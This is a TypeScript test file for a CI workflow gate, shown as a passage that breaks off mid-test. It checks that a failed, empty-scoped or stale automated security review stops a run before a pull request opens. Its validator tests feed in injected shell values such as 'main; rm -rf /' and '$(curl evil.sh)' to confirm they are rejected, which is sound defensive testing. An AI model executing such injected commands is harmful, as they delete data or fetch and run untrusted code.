import { describe, expect, test } from "bun:test";
import { readFileSync } from "fs";
import { join } from "path";

import {
  reviewIsCurrent,
  rookGateVerdict,
  rookReviewSha,
  rookScopeCommand,
} from "../lib/security-verdict";

/**
 * #129 — the security review can now fail a run.
 *
 * Measured twice in production before this existed: rook returned
 * `{"result":"FAIL"}` with a reproduced HIGH guard bypass, and ship.js
 * returned SHIPPED and opened a PR. The verdict was computed, logged, graded —
 * and read by nothing that could stop anything.
 *
 * ship.js is not importable (the Workflow sandbox has no module loading, #69),
 * so the blocks under test are extracted by marker and executed with stubs,
 * the same way test/verify-fanout.test.ts and
 * test/workflow-security-integration.test.ts do it.
 */

const REPO_ROOT = join(import.meta.dir, "..");
const SHIP_PATH = join(REPO_ROOT, "workflows", "ship.js");
const shipSource = readFileSync(SHIP_PATH, "utf-8");

function sliceBlock(startMarker: string, endMarker: string): string {
  const start = shipSource.indexOf(startMarker);
  const end = shipSource.indexOf(endMarker);
  if (start === -1 || end === -1) {
    throw new Error(`ship.js is missing the ${startMarker} / ${endMarker} markers`);
  }
  return shipSource.slice(start + startMarker.length, end);
}

const SECURITY_START = "// ──── ROOK-SECURITY-START ────";
const SECURITY_END = "// ──── ROOK-SECURITY-END ────";
const DECISION_START = "// ──── SECURITY-DECISION-START ────";
const DECISION_END = "// ──── SECURITY-DECISION-END ────";
const FANOUT_START = "// ──── VERIFY-FANOUT-START ────";
const FANOUT_END = "// ──── VERIFY-FANOUT-END ────";

const RECOMMIT_START = "// ──── RECOMMIT-STALENESS-START ────";
const RECOMMIT_END = "// ──── RECOMMIT-STALENESS-END ────";

/** The inlined copies ship.js actually runs. */
const inlined = new Function(
  `${sliceBlock(SECURITY_START, SECURITY_END)}
   return { rookReviewSha, rookScopeCommand, rookGateVerdict, reviewIsCurrent }`,
)() as {
  rookReviewSha: typeof rookReviewSha;
  rookScopeCommand: typeof rookScopeCommand;
  rookGateVerdict: typeof rookGateVerdict;
  reviewIsCurrent: typeof reviewIsCurrent;
};

const SHA = "3192a75c4f1e2b8d9a0c5e6f7081a2b3c4d5e6f7";
/** The #164 branch tip — a different commit from SHA, not a different string. */
const OTHER_SHA = "ef998b73c4f1e2b8d9a0c5e6f7081a2b3c4d5e6f";
const GOOD_SCOPE = { exitCode: 0, files: ["workflows/ship.js", "lib/security-verdict.ts"] };

/**
 * Execute the decision block with the module-scope names ship.js gives it.
 * The block ends in `return { status: 'SHIP_FAILED', ... }` on a block, and
 * falls through returning undefined when the run may proceed.
 */
function decide(opts: {
  verifyResult: unknown;
  securityVerdict: { spawned: boolean; verdict: string; failures: string[] };
  /** What rook was pinned to. Defaults to a review of the current tip. */
  reviewSha?: unknown;
  /** What the branch ends at now, as the head-sha step reported it. */
  headSha?: unknown;
}) {
  const logs: string[] = [];
  const block = sliceBlock(DECISION_START, DECISION_END);
  const factory = new Function(
    "log", "verifyResult", "securityVerdict", "shipBranch", "ISSUE", "SLUG", "WORK_DIR",
    "reviewSha", "headSha", "reviewIsCurrent",
    `return (async () => {${block}\nreturn undefined})()`,
  );
  const result = factory(
    (m: unknown) => logs.push(String(m)),
    opts.verifyResult,
    opts.securityVerdict,
    "129-deep-modules",
    129,
    "pai-harness-129",
    "/tmp/work",
    "reviewSha" in opts ? opts.reviewSha : SHA,
    "headSha" in opts ? opts.headSha : SHA,
    // ship.js's own copy, not the library's — the decision runs the inlined
    // one, and a test that wired in the library would pass while the two
    // had drifted.
    inlined.reviewIsCurrent,
  ) as Promise<Record<string, unknown> | undefined>;
  return { result, logs };
}

// ── AC-1 ────────────────────────────────────────────────────────────────

describe("AC-1: a rook FAIL stops the run", () => {
  const PASSING = { spawned: true, verdict: "PASS", failures: [] as string[] };

  test("rook FAIL returns SHIP_FAILED", async () => {
    const { result, logs } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: {
        spawned: true,
        verdict: "FAIL",
        failures: ["guard bypass in gates/run-gate.ts:120"],
      },
    });
    const out = await result;
    expect(out?.status, "a FAIL security verdict let the run continue").toBe("SHIP_FAILED");
    expect(String(out?.reason)).toContain("guard bypass in gates/run-gate.ts:120");
    expect(logs.some(l => /guard bypass in gates\/run-gate\.ts:120/.test(l))).toBe(true);
  });

  test("the verdict object travels with the refusal", async () => {
    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: { spawned: true, verdict: "FAIL", failures: ["x"] },
    });
    const out = await result;
    expect((out?.security as Record<string, unknown>)?.verdict).toBe("FAIL");
    expect(out?.issue).toBe(129);
  });

  test("a PASS verdict falls through so the run can continue", async () => {
    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: PASSING,
    });
    expect(await result, "a passing security review stopped the run").toBeUndefined();
  });

  test("the fail-closed default blocks a run where security never ran", async () => {
    // ship.js's REAL initialiser, executed — not a value this test made up.
    // If the fan-out throws, or a future edit forgets to assign it, this is
    // what the decision point sees, and it must refuse. Asserting a
    // hand-written copy here would pass even if ship.js initialised to PASS.
    const initialiser = new Function(
      `${sliceBlock("// ──── SECURITY-DEFAULT-START ────", "// ──── SECURITY-DEFAULT-END ────")}
       return securityVerdict`,
    )() as { spawned: boolean; verdict: string; failures: string[] };

    expect(initialiser.verdict, "ship.js starts the run with security already passed").toBe("FAIL");
    expect(initialiser.spawned).toBe(false);
    expect(initialiser.failures.length).toBeGreaterThan(0);

    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: initialiser,
    });
    expect((await result)?.status).toBe("SHIP_FAILED");
  });

  test("the decision reads verifyResult at the same point", () => {
    // AC-1 places the security decision beside the verify decision rather than
    // in a second, later place that a future edit could return before.
    const block = sliceBlock(DECISION_START, DECISION_END);
    expect(block).toContain("verifyResult?.result");
    expect(block).toContain("securityVerdict");
  });

  test("no PR step is invoked after the refusal", () => {
    // Structural, because the PR step is 170 lines further down and cannot be
    // stubbed into the extracted block: assert the refusal's `return` comes
    // first in the file, so nothing between it and the PR step can run.
    const refusal = shipSource.indexOf(DECISION_END);
    const prStep = shipSource.indexOf("record-env-and-pr");
    expect(prStep, "the PR step label moved — this guard no longer checks anything")
      .toBeGreaterThan(-1);
    expect(
      refusal,
      "the security decision now happens AFTER the PR is opened, which is the bug",
    ).toBeLessThan(prStep);
  });
});

// ── AC-2 ────────────────────────────────────────────────────────────────

describe("AC-2: the review scope is the commit SHA", () => {
  test("review scope is the commit SHA, not a worktree's HEAD", async () => {
    const prompts = await runFanoutPrompts();
    const rookPrompt = prompts.find(p => /Security review/.test(p)) || "";
    expect(rookPrompt, "rook's prompt does not name the commit under review").toContain(SHA);
    expect(
      rookPrompt,
      "rook is still scoped to origin/main...HEAD of whatever worktree it was given — " +
        "that diff was EMPTY on both production runs",
    ).not.toContain("origin/main...HEAD");
  });

  test("the scope command pins git to the workflow-supplied SHA", () => {
    const cmd = rookScopeCommand("/p", "/h", SHA, "/w/scope.json");
    expect(cmd).toContain(`--sha ${SHA}`);
    expect(cmd).toContain("/h/scripts/rook-review-scope.ts");
    expect(cmd).toContain(`--out ${shellQuote("/w/scope.json")}`);
    // A path with a space is the case unquoted interpolation breaks on first,
    // and it needs no attacker — PROJECT_ROOT is wherever the repo is checked
    // out. Asserted against shellQuote's own output so the expectation tracks
    // ship.js's quoting rather than restating it.
    const spaced = rookScopeCommand("/My Projects/p", "/h", SHA, "/w/s.json");
    expect(spaced).toContain(`--project ${shellQuote("/My Projects/p")}`);
    expect(spaced).toContain(`cd ${shellQuote("/My Projects/p")}`);
  });

  test("rookReviewSha accepts a SHA and refuses anything else", () => {
    expect(rookReviewSha("3192a75")).toBe("3192a75");
    expect(rookReviewSha("3192A75")).toBe("3192a75");
    expect(rookReviewSha(" 3192a75 ")).toBe("3192a75");
    for (const bad of ["HEAD", "main", "abc", "", null, undefined, 42, {}, "3192a75; rm -rf /"]) {
      expect(rookReviewSha(bad), `${JSON.stringify(bad)} was accepted as a review SHA`).toBeNull();
    }
  });

  test("the scope command refuses to be built from a non-SHA", () => {
    for (const bad of ["HEAD", "main; rm -rf /", "", "$(curl evil.sh)"]) {
      expect(() => rookScopeCommand("/p", "/h", bad, "/w/s.json")).toThrow(/not a commit SHA/i);
    }
  });
});

// ── AC-3 / AC-6 ─────────────────────────────────────────────────────────

describe("AC-3: an empty scope blocks the run", () => {
  test("empty scope blocks even when rook returns PASS", () => {
    const v = rookGateVerdict({ exitCode: 0, files: [] }, { result: "PASS" });
    expect(v.verdict, "rook reviewed nothing and the run was allowed to proceed").toBe("FAIL");
    expect(v.failures.join(" ")).toMatch(/empty/i);
  });

  test("a non-empty scope with a rook PASS is the only way through", () => {
    expect(rookGateVerdict(GOOD_SCOPE, { result: "PASS" })).toEqual({
      spawned: true,
      verdict: "PASS",
      failures: [],
    });
  });

  test("the scope script itself refuses an empty diff", () => {
    // The other half: the workflow-side check above is only meaningful if the
    // script can actually produce exitCode != 0. Covered end-to-end against a
    // real git repository in test/rook-review-scope.test.ts.
    const scopeSource = readFileSync(join(REPO_ROOT, "scripts", "rook-review-scope.ts"), "utf-8");
    expect(scopeSource).toContain("REFUSE_EXIT");
  });
});

describe("AC-6: the scope determination fails closed", () => {
  const MALFORMED: Array<[string, unknown]> = [
    ["nothing at all", undefined],
    ["null", null],
    ["a string instead of a report", "ok"],
    ["a report with no exitCode", { files: ["a.ts"] }],
    ["a non-zero exitCode", { exitCode: 1, files: ["a.ts"] }],
    ["exitCode as a string", { exitCode: "0", files: ["a.ts"] }],
    ["files missing", { exitCode: 0 }],
    ["files null", { exitCode: 0, files: null }],
    ["files as a string", { exitCode: 0, files: "a.ts" }],
    ["files as an object", { exitCode: 0, files: { 0: "a.ts" } }],
    ["files empty", { exitCode: 0, files: [] }],
    // A list whose entries are not usable paths is the same absence of a
    // reviewed scope as an empty list, and `files.length` cannot tell them
    // apart. Found by security review of this change: the earlier draft
    // filtered to non-blank strings before counting and this one dropped it,
    // which is a fail-open inside a function whose contract is to fail closed
    // everywhere.
    ["files containing only an empty string", { exitCode: 0, files: [""] }],
    ["files containing only whitespace", { exitCode: 0, files: ["   ", "\t"] }],
    ["files containing nulls", { exitCode: 0, files: [null, null] }],
    ["files containing numbers", { exitCode: 0, files: [1, 2] }],
    ["files containing nested arrays", { exitCode: 0, files: [["a.ts"]] }],
  ];

  for (const [label, scope] of MALFORMED) {
    test(`fails closed on a malformed scope report — ${label}`, () => {
      const v = rookGateVerdict(scope, { result: "PASS" });
      expect(
        v.verdict,
        `${label} was treated as a successful non-empty scope`,
      ).toBe("FAIL");
      expect(v.failures.length).toBeGreaterThan(0);
    });
  }

  test("a usable path beside an unusable one is still a scope", () => {
    // The positive control for the filter above. A stricter rule — "every
    // entry must be a non-blank string" — would reject this, and then the
    // whole matrix would pass for a reason that has nothing to do with
    // emptiness. git produces clean paths; the filter exists to stop a
    // report of nothing from counting as a report of something.
    const v = rookGateVerdict({ exitCode: 0, files: ["", "lib/a.ts"] }, { result: "PASS" });
    expect(v.verdict).toBe("PASS");
  });

  test("a missing rook result is a FAIL, not a skip", () => {
    for (const rook of [undefined, null, {}, { result: "MAYBE" }, { result: "SKIP" }]) {
      const v = rookGateVerdict(GOOD_SCOPE, rook);
      expect(v.verdict, `rook returning ${JSON.stringify(rook)} was treated as a pass`).toBe("FAIL");
    }
  });

  test("a rook FAIL with no detail still names something actionable", () => {
    // gates/SCHEMA-GUIDE.md: a FAIL verdict must carry a non-empty failures
    // list. A FAIL nobody can act on blocks the run without saying what to fix.
    for (const rook of [
      { result: "FAIL" },
      { result: "FAIL", failures: [] },
      { result: "FAIL", failures: null },
      { result: "FAIL", failures: "injection in lib/a.ts" },
    ]) {
      const v = rookGateVerdict(GOOD_SCOPE, rook);
      expect(v.verdict).toBe("FAIL");
      expect(v.failures.length, JSON.stringify(rook)).toBeGreaterThan(0);
      for (const f of v.failures) expect(typeof f).toBe("string");
    }
  });

  test("rook's own failure strings are carried through", () => {
    const v = rookGateVerdict(GOOD_SCOPE, {
      result: "FAIL",
      failures: ["secret logged at gates/run-gate.ts:120", "unvalidated path join"],
    });
    expect(v.failures).toEqual([
      "secret logged at gates/run-gate.ts:120",
      "unvalidated path join",
    ]);
  });

  test("spawned reflects whether rook actually returned anything", () => {
    expect(rookGateVerdict(GOOD_SCOPE, null).spawned).toBe(false);
    expect(rookGateVerdict(GOOD_SCOPE, { result: "PASS" }).spawned).toBe(true);
  });
});

// ── AC-4 ────────────────────────────────────────────────────────────────

describe("AC-4: the verdict is recorded in workflow-state.json", () => {
  test("records the security verdict in workflow-state", async () => {
    // The write itself is exercised end-to-end against a real file in
    // test/record-security-verdict.test.ts. What this asserts is the half that
    // lives in the workflow: the recorder is invoked, pointed at this run's
    // state file, and told the verdict the WORKFLOW computed — not one an
    // agent restated back.
    const { done, prompts } = runFanout({
      rook: { result: "FAIL", failures: ["guard bypass"] },
    });
    await done;
    const record = prompts.find(p => /record-security-verdict\.ts/.test(p)) || "";
    expect(record, "nothing in the fan-out records the verdict").not.toBe("");
    expect(record).toContain(`--state ${shellQuote("/tmp/work/workflow-state.json")}`);
    expect(record).toContain(`--verdict ${shellQuote("FAIL")}`);
    expect(record).toContain(`--spawned ${shellQuote("true")}`);
    expect(record).toContain(`--findings ${shellQuote("/tmp/work/rook-findings.json")}`);
  });

  test("every path in the record command is shell-quoted", async () => {
    // Not because any of these is agent-reported — they are workflow
    // arguments — but because ship.js:377 is the record of an unquoted path
    // that was safe until what fed it changed, and a project root containing
    // a space is the ordinary case that breaks first. Written against
    // shellQuote's output rather than a literal `'`, so the assertion follows
    // the quoting ship.js actually uses.
    const { done, prompts } = runFanout();
    await done;
    const record = prompts.find(p => /record-security-verdict\.ts/.test(p)) || "";
    for (const flag of ["--state", "--findings", "--scope", "--verdict", "--spawned"]) {
      const value = record.match(new RegExp(`${flag} (\\S+)`))?.[1];
      expect(value, `${flag} is missing from the record command`).toBeDefined();
      expect(value!.startsWith("'") && value!.endsWith("'"), `${flag} ${value} is unquoted`).toBe(true);
    }
  });

  test("the recorded verdict is the workflow's, not rook's bare answer", async () => {
    // rook says PASS; the scope was empty, so the run is a FAIL and the
    // artefact must say FAIL. A record that echoed rook would claim this run
    // was security-reviewed when it reviewed nothing.
    const { done, prompts } = runFanout({
      rook: { result: "PASS" },
      scope: { exitCode: 0, files: [] },
    });
    await done;
    const record = prompts.find(p => /record-security-verdict\.ts/.test(p)) || "";
    expect(record).toContain(`--verdict ${shellQuote("FAIL")}`);
  });

  test("the record step runs for a PASS as well as a FAIL", async () => {
    const { done, labels } = runFanout({ rook: { result: "PASS" } });
    await done;
    expect(
      labels,
      "a passing review leaves no record, so the artefact cannot say security ran",
    ).toContain("record-security");
  });

  test("the record step runs when rook FAILs", async () => {
    const { done, labels } = runFanout({ rook: { result: "FAIL", failures: ["boom"] } });
    await done;
    expect(labels).toContain("record-security");
  });

  test("agents.rook.failures survives the schema", async () => {
    // Zod strips undeclared keys. Without `failures` on AgentSchema a rook FAIL
    // round-trips as a verdict with no reasons attached.
    const { WorkflowStateSchema } = await import("../gates/schema");
    const parsed = WorkflowStateSchema.partial().safeParse({
      agents: {
        rook: { spawned: true, verdict: "FAIL", failures: ["a", "b"] },
      },
    });
    expect(parsed.success, JSON.stringify((parsed as { error?: unknown }).error)).toBe(true);
    expect(
      (parsed as { data: { agents: { rook: { failures?: string[] } } } }).data.agents.rook.failures,
    ).toEqual(["a", "b"]);
  });

  test("agents.rook.failures rejects a bare string", async () => {
    const { WorkflowStateSchema } = await import("../gates/schema");
    const parsed = WorkflowStateSchema.partial().safeParse({
      agents: { rook: { spawned: true, verdict: "FAIL", failures: "one long prose blob" } },
    });
    expect(parsed.success).toBe(false);
  });
});

// ── AC-5 ────────────────────────────────────────────────────────────────

describe("AC-5: the standard no longer makes security conditional on size", () => {
  const spec = readFileSync(join(REPO_ROOT, "specs", "HARNESS-STANDARD.md"), "utf-8");

  for (const [label, pattern] of [
    ["the §5 process list", /If M\+ size .*Rook/],
    ["the Quality bar line", /Rook PASS if M\+/],
    ["the VERIFICATION mermaid node", /Rook security \(if M\+\)/],
    ["the phase table", /Quinn\/Rook conditional/],
  ] as Array<[string, RegExp]>) {
    test(`${label} no longer gates the security review on size`, () => {
      expect(spec.match(new RegExp(pattern, "g")) || []).toEqual([]);
    });
  }

  test("the standard still mentions the security review at all", () => {
    // The over-fix guard: deleting every mention of Rook would satisfy the four
    // assertions above while removing the requirement entirely.
    expect(spec).toMatch(/Rook/);
    expect(spec).toMatch(/every (build )?cycle|always/i);
  });
});

// ── the inlined copy must not drift from the library ────────────────────

describe("ship.js's inlined helpers match lib/security-verdict.ts", () => {
  // Same reasoning as test/workflow-security-integration.test.ts AC-4: ship.js
  // cannot import, so it carries copies, and a copy that has drifted is how a
  // fix lands in one place and not the other. computeACHash already did this
  // once in this repo — the lib sorted its input and the inline copy did not.

  test("rookReviewSha agrees on every input", () => {
    for (const v of ["3192a75", "3192A75", " abc1234 ", "HEAD", "", null, undefined, 7, {}, []]) {
      expect(inlined.rookReviewSha(v), JSON.stringify(v)).toEqual(rookReviewSha(v));
    }
  });

  test("rookScopeCommand agrees", () => {
    expect(inlined.rookScopeCommand("/p", "/h", SHA, "/w/s.json")).toBe(
      rookScopeCommand("/p", "/h", SHA, "/w/s.json"),
    );
    expect(() => inlined.rookScopeCommand("/p", "/h", "HEAD", "/w/s.json")).toThrow();
  });

  test("rookGateVerdict agrees on every scope/rook pair", () => {
    const scopes: unknown[] = [
      undefined, null, "ok", {}, { exitCode: 0 }, { exitCode: 1, files: ["a"] },
      { exitCode: 0, files: [] }, { exitCode: 0, files: "a" }, GOOD_SCOPE,
    ];
    const rooks: unknown[] = [
      undefined, null, {}, { result: "PASS" }, { result: "FAIL" },
      { result: "FAIL", failures: ["a", "b"] }, { result: "SKIP" },
    ];
    for (const s of scopes) {
      for (const r of rooks) {
        expect(
          inlined.rookGateVerdict(s, r),
          `drift at scope=${JSON.stringify(s)} rook=${JSON.stringify(r)}`,
        ).toEqual(rookGateVerdict(s, r));
      }
    }
  });
});

// ── fan-out harness shared by the AC-2 and AC-4 tests ───────────────────

/**
 * ship.js's own `shellQuote`, extracted rather than reimplemented.
 *
 * The fan-out block quotes the paths it hands to the record step, and a stub
 * that quoted differently from production would make these tests agree with
 * something that does not run. Extraction also fails loudly if the function is
 * renamed, instead of silently testing a local copy of the old one.
 */
const shellQuote: (word: unknown) => string = (() => {
  const match = shipSource.match(/function shellQuote\(word\) \{[\s\S]*?\n\}/);
  if (!match) {
    throw new Error("ship.js no longer defines shellQuote(word) — this harness extracts it by name");
  }
  return new Function(`${match[0]}\nreturn shellQuote`)();
})();

function runFanout(opts: { rook?: unknown; scope?: unknown } = {}) {
  const block = sliceBlock(FANOUT_START, FANOUT_END);
  const labels: string[] = [];
  const prompts: string[] = [];
  const logs: string[] = [];

  const factory = new Function(
    "log", "agent", "briefedAgent", "parallel", "discovery", "projectConfig",
    "PROJECT_ROOT", "HARNESS_ROOT", "WORK_DIR", "ISSUE", "GATE_RESULT_SCHEMA",
    "reviewSha", "rookScopeCommand", "rookGateVerdict", "securityVerdict",
    "shellQuote",
    `return (async () => {${block}})()`,
  );

  const done = factory(
    (m: unknown) => logs.push(String(m)),
    async (p: string, o: { label: string }) => {
      labels.push(o.label);
      prompts.push(p);
      if (o.label === "rook-scope") return opts.scope ?? GOOD_SCOPE;
      return {};
    },
    async (p: string, o: { label: string }) => {
      labels.push(o.label);
      prompts.push(p);
      return o.label === "rook" ? (opts.rook ?? { result: "PASS" }) : { result: "PASS" };
    },
    (thunks: Array<() => Promise<unknown>>) => Promise.all(thunks.map(t => t())),
    { ceremonyTier: "LIGHT", acs: [], filesToModify: ["lib/a.ts"] },
    { container: null },
    REPO_ROOT, REPO_ROOT, "/tmp/work", 129, {},
    SHA,
    inlined.rookScopeCommand,
    inlined.rookGateVerdict,
    { spawned: false, verdict: "FAIL", failures: ["the security review did not run"] },
    shellQuote,
  ) as Promise<void>;

  return { done, labels, prompts, logs };
}

async function runFanoutPrompts(): Promise<string[]> {
  const { done, prompts } = runFanout();
  await done;
  return prompts;
}

// ── #169: the verdict must describe the commit the PR is opened from ────
//
// #129 made rook's verdict block the run. It did not make the verdict a
// statement about the PR. The review is pinned to one commit and the
// remediation rounds that follow it commit again to the same branch, so a
// `rook: PASS` can be — and on the #164 run was — a review of a tree the
// branch no longer ends at: testedSha 3fe336f1, branch tip ef998b73, and a
// diff between them that rewrote all four reviewed files.

/** The #164 pair, as measured. */
const TESTED_164 = "3fe336f1";
const TIP_164 = "ef998b73";

/**
 * ONE matrix, driven through the library copy (AC-3) and ship.js's inlined
 * copy (AC-4). Two matrices would let the copies disagree on a row only one of
 * them was ever given.
 */
const CURRENCY_MATRIX: Array<[string, unknown, unknown, boolean]> = [
  // ── current ──
  ["two identical full SHAs", SHA, SHA, true],
  ["an abbreviated review against the full tip", SHA.slice(0, 7), SHA, true],
  ["a full review against an abbreviated tip", SHA, SHA.slice(0, 12), true],
  ["uppercase on one side", SHA.toUpperCase(), SHA, true],
  ["whitespace around one side", ` ${SHA} `, SHA, true],

  // ── stale ──
  ["the #164 pair", TESTED_164, TIP_164, false],
  ["two full SHAs differing in the last character", SHA, `${SHA.slice(0, 39)}0`, false],
  ["an abbreviation that differs at character 7", "3192a7f", SHA, false],
  ["a review of an unrelated commit", SHA, OTHER_SHA, false],

  // ── fails closed: no usable review SHA ──
  ["no review SHA at all", null, SHA, false],
  ["an undefined review SHA", undefined, SHA, false],
  ["an empty review SHA", "", SHA, false],
  ["a ref name as the review SHA", "HEAD", SHA, false],
  ["a branch name as the review SHA", "main", SHA, false],
  ["a six-character review SHA", "3192a7", SHA, false],
  ["a 41-character review SHA", `${SHA}a`, SHA, false],
  ["a non-hex review SHA", "g192a75", SHA, false],
  ["a review SHA with a command in it", "3192a75; rm -rf /", SHA, false],
  ["a numeric review SHA", 3192475, SHA, false],
  ["an object as the review SHA", {}, SHA, false],

  // ── fails closed: no usable branch tip ──
  ["no branch tip at all", SHA, null, false],
  ["an undefined branch tip", SHA, undefined, false],
  ["an empty branch tip", SHA, "", false],
  ["whitespace as the branch tip", SHA, "   ", false],
  ["a ref name as the branch tip", SHA, "HEAD", false],
  ["an error message as the branch tip", SHA, "fatal: not a git repository", false],
  ["a tip with a command in it", SHA, "3192a75 && curl evil.sh", false],
  ["an array as the branch tip", SHA, [SHA], false],
  ["neither side usable", null, undefined, false],
];

describe("AC-3 (#169): reviewIsCurrent fails closed", () => {
  for (const [label, tested, head, expected] of CURRENCY_MATRIX) {
    test(`${expected ? "current" : "stale"}: ${label}`, () => {
      const r = reviewIsCurrent(tested, head);
      expect(
        r.current,
        expected
          ? `${label} was reported stale, which would refuse a run that is fine`
          : `${label} was reported current, so a review of another commit would ship`,
      ).toBe(expected);
      if (expected) {
        expect(r.reason).toBeNull();
      } else {
        expect(r.reason, `${label} is stale with no reason to show anyone`).toBeTruthy();
      }
    });
  }

  test("the matrix contains both outcomes", () => {
    // The positive control for the sweep above: a function returning
    // `current: false` unconditionally — the easy way to make a staleness
    // check "work" — satisfies every negative row, and nothing else here
    // would notice.
    const current = CURRENCY_MATRIX.filter(([, , , e]) => e).length;
    expect(current, "no row expects a current review").toBeGreaterThan(0);
    expect(CURRENCY_MATRIX.length - current, "no row expects a stale review").toBeGreaterThan(0);
  });

  test("the reason names both commits when they differ", () => {
    const r = reviewIsCurrent(TESTED_164, TIP_164);
    expect(r.reason).toContain(TESTED_164);
    expect(r.reason).toContain(TIP_164);
    expect(r.testedSha).toBe(TESTED_164);
    expect(r.headSha).toBe(TIP_164);
  });

  test("normalised SHAs come back out, not the raw input", () => {
    const r = reviewIsCurrent(` ${SHA.toUpperCase()} `, SHA);
    expect(r.testedSha).toBe(SHA);
    expect(r.headSha).toBe(SHA);
  });
});

describe("AC-4 (#169): the inlined reviewIsCurrent agrees with the library", () => {
  // Same reasoning as the three helpers above: ship.js cannot import, so it
  // carries a copy, and computeACHash has already drifted this way once in
  // this repo. Driven over the SAME matrix as AC-3 rather than a second list.
  for (const [label, tested, head] of CURRENCY_MATRIX) {
    test(`agrees on ${label}`, () => {
      expect(
        inlined.reviewIsCurrent(tested, head),
        `drift at tested=${JSON.stringify(tested)} head=${JSON.stringify(head)}`,
      ).toEqual(reviewIsCurrent(tested, head));
    });
  }
});

describe("AC-1/AC-2 (#169): a stale review stops the run", () => {
  const PASSING = { spawned: true, verdict: "PASS", failures: [] as string[] };

  test("a stale review returns SHIP_FAILED", async () => {
    const { result, logs } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: PASSING,
      reviewSha: TESTED_164,
      headSha: TIP_164,
    });
    const out = await result;
    expect(
      out?.status,
      "the branch moved after the review and the run was allowed to open a PR",
    ).toBe("SHIP_FAILED");
    expect(String(out?.reason)).toContain("SECURITY_REVIEW_STALE");
    expect(String(out?.reason)).toContain(TESTED_164);
    expect(String(out?.reason)).toContain(TIP_164);
    expect(logs.some(l => /SECURITY_REVIEW_STALE/.test(l))).toBe(true);
  });

  test("the stale refusal carries the two SHAs it compared", async () => {
    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: PASSING,
      reviewSha: TESTED_164,
      headSha: TIP_164,
    });
    const out = await result;
    const security = out?.security as Record<string, unknown>;
    expect(security?.testedSha).toBe(TESTED_164);
    expect(security?.headSha).toBe(TIP_164);
    expect(out?.issue).toBe(129);
    expect(out?.workDir).toBe("/tmp/work");
  });

  test("an unreadable branch tip is stale, not a pass", async () => {
    for (const head of [undefined, null, "", "HEAD", "fatal: not a git repository"]) {
      const { result } = decide({
        verifyResult: { result: "PASS" },
        securityVerdict: PASSING,
        reviewSha: SHA,
        headSha: head,
      });
      expect(
        (await result)?.status,
        `a branch tip of ${JSON.stringify(head)} was treated as matching the review`,
      ).toBe("SHIP_FAILED");
    }
  });

  test("a review of the current tip is not stale", async () => {
    // The positive control. Without it, refusing every run satisfies every
    // assertion above — and a gate that always refuses is the one failure mode
    // this check cannot afford, because it gets switched off.
    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: PASSING,
      reviewSha: SHA,
      headSha: SHA,
    });
    expect(await result, "a current review stopped the run").toBeUndefined();
  });

  test("the ordinary short-SHA case is not stale", async () => {
    // The commit step reports `git rev-parse --short HEAD`; the tip is read
    // with `git rev-parse HEAD`. Compared character for character, EVERY run
    // would refuse here.
    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: PASSING,
      reviewSha: SHA.slice(0, 7),
      headSha: SHA,
    });
    expect(await result, "the normal short-vs-full SHA pair was refused as stale").toBeUndefined();
  });

  test("a rook FAIL still blocks when the review is also stale", async () => {
    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: { spawned: true, verdict: "FAIL", failures: ["guard bypass"] },
      reviewSha: TESTED_164,
      headSha: TIP_164,
    });
    const out = await result;
    expect(out?.status).toBe("SHIP_FAILED");
    expect(String(out?.reason)).toContain("guard bypass");
  });

  test("the staleness check shares the rook FAIL return path", () => {
    // AC-2: one place the run is refused, not a second one further down that a
    // later edit can return before.
    const block = sliceBlock(DECISION_START, DECISION_END);
    expect(block).toContain("reviewIsCurrent");
    expect(block).toContain("testedSha");
    expect(block).toContain("headSha");
    expect(block).toContain("SECURITY_REVIEW_STALE");
    expect((block.match(/status: 'SHIP_FAILED'/g) || []).length).toBe(2);
  });

  test("the stale refusal is ahead of the PR step", () => {
    // Structural for the same reason as the rook-FAIL version above: the PR
    // step is 170 lines further down and cannot be stubbed into the block.
    const refusal = shipSource.indexOf(DECISION_END);
    const prStep = shipSource.indexOf("record-env-and-pr");
    expect(prStep).toBeGreaterThan(-1);
    expect(refusal, "the staleness decision now happens after the PR is opened").toBeLessThan(prStep);
  });

  test("the review is pinned to the tip, not to the first commit of the run", () => {
    // The other half of #169, and the one that keeps the refusal above off
    // the common path: the Verify remediation loop commits BEFORE the review
    // is spawned, so pinning rook to `commitResult.commitSha` would both
    // review a stale tree and then refuse the run for it.
    //
    // Ordering, not just presence — a tracked tip assigned after the value is
    // read is the same bug with more code.
    const declared = shipSource.indexOf("let branchTipSha = commitResult.commitSha");
    const moved = shipSource.indexOf("branchTipSha = reCommit.commitSha");
    const read = shipSource.indexOf("const reviewSha = rookReviewSha(branchTipSha)");
    expect(declared, "ship.js does not track the branch tip").toBeGreaterThan(-1);
    expect(moved, "no remediation round moves the tracked tip").toBeGreaterThan(declared);
    expect(read, "the review is not pinned to the tracked tip").toBeGreaterThan(moved);
    expect(shipSource).not.toContain("rookReviewSha(commitResult.commitSha)");
  });

  /**
   * The HEAD-SHA block, executed with a stubbed agent.
   *
   * Asserting that the block CONTAINS "git rev-parse HEAD" is not enough, and
   * that is measured rather than assumed: `const headSha = reviewSha` — the
   * comparison reduced to comparing the review against itself — left the
   * whole file green while the prompt text sat there unused
   * (.claude/rules/checks-must-be-able-to-fail.md).
   */
  async function readHead(reply: unknown, reviewShaValue: unknown = SHA) {
    const block = sliceBlock("// ──── HEAD-SHA-START ────", "// ──── HEAD-SHA-END ────");
    const prompts: string[] = [];
    const calls: Array<{ label: string }> = [];
    const headSha = await (new Function(
      "agent", "shellQuote", "commitDir", "log", "reviewSha",
      `return (async () => {${block}\nreturn headSha})()`,
    )(
      async (p: string, o: { label: string }) => {
        prompts.push(p);
        calls.push(o);
        return reply;
      },
      (w: unknown) => `'${String(w).replace(/'/g, "'\\''")}'`,
      "/Users/dev/proj/.claude/worktrees/wf_a-1",
      () => {},
      reviewShaValue,
    ) as Promise<unknown>);
    return { headSha, prompt: prompts[0] ?? "", opts: calls[0] ?? { label: "" } };
  }

  test("the branch tip comes from git, not from the reviewed SHA", async () => {
    const { headSha, prompt, opts } = await readHead({ headSha: OTHER_SHA }, SHA);
    expect(
      headSha,
